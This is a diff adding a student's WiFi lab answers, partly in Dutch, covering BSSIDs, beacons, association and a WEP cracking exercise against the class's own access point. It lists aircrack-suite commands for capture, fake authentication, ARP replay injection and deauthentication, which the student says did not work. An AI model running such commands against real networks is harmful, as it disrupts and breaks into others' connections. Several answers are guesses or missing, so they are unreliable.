@@ -1157,3 +1157,134 @@ Fa0/6            Desg FWD 19        128.6    P2p
 Fa0/24           Root FWD 19        128.24   P2p
 ```
 
+
+
+
+
+# WiFi
+
+## Part I
+
+1. What is the BSSID value of your access point? (You’ll need this in future commands.)
+
+![image-20220324153923997](img/image-20220324153923997.png)
+
+```
+04:F0:21:1C:B4:D5
+```
+
+
+
+2. As stated before, the BSSID needs to be unique for each access point. What does the access point use as BSSID identifier to achieve this goal?
+
+```
+mac address
+```
+
+
+
+3. Are there any packets sent? If yes, who is sending these packets and how often? 
+
+![image-20220324155854749](img/image-20220324155854749.png)
+
+```
+The other groups, very often
+```
+
+4. Which packets are sent by your access point? Why are these packets necessary? What useful information do these packets contain? 
+
+```
+SSID broadcast om netwerk vindbaar te maken
+```
+
+5. Why do you also see packets from machines other than from your access point?
+
+```
+sniffer, wireless
+```
+
+
+
+![image-20220324160316747](img/image-20220324160316747.png)
+
+
+
+
+
+6. Which packets are sent when a device (dis)connects to/from the access point (write down a message chart for both)? 
+
+![image-20220324164114541](img/image-20220324164114541.png)
+
+![image-20220324164248451](img/image-20220324164248451.png)
+
+7. How long does it take to fully associate to the access point (up to and including the assignment of the IP address)?
+
+```
+about 2 seconds
+```
+
+
+
+8. Now which packets are always the same size, occur automatically between connected PCs in order to make the IP protocol work (also on wired networks) and will be replyed upon by the AP with a packet of which we will know its content?
+
+```
+ARP
+```
+
+
+
+
+
+
+
+![image-20220324170011261](img/image-20220324170011261.png)
+
+
+
+De commando's die ik heb gebruikt. (kleine sidenote, het lukte niet)
+
+```
+airodump-ng -c 5 --bssid 04:F0:21:1C:B4:D5 -w dump wlanMoni
+
+aireplay-ng --fakeauth 6000 -o 1 -q 10 -a 04:F0:21:1C:B4:D5 -e MobanGr15 wlanAttack
+
+aireplay-ng --fakeauth 6000 -o 1 -q 10 -a 04:F0:21:1C:B4:D5 -e MobanGr15 -h 00:0e:8e:6a:f5:b8 wlanAttack
+
+aireplay-ng -3 -b 04:F0:21:1C:B4:D5 -h 00:0e:8e:6a:f5:b8 wlanAttack
+
+aireplay-ng --deauth 5 -a 04:F0:21:1C:B4:D5 -c 00:0e:8e:6a:f5:b8 wlanAttack
+```
+
+
+
+9. Now that the home user’s traffic is encrypted, can you still apply the deauthentication command on the attacker’s machine ? Why (not)? (hint: examine the deauthentication message within dump-xx.cap file)
+
+```
+Deauth frames aren't encrypted in WEP.
+```
+
+
+
+10. Why does disassociating the home user speeds up the WEP cracking process?
+
+```
+This forces the user to reassociate with the AP, creating an ARP request. We'll resend this to the AP. This gives us more packets with the same encrypted content to try and crack. (denk ik)
+```
+
+
+
+11. How long does it take to crack the WEP key? 
+
+
+```
+A few minutes
+```
+
+
+
+11. Both the client and the AP know the 40-bit WEP key, but how does the client know the 24-bit Initialization Vector (IV) to decrypt a packet? (hint: examine the dump-xx.cap file)
+
+```
+ik ga naar huis sorry het is tijd
+```
+
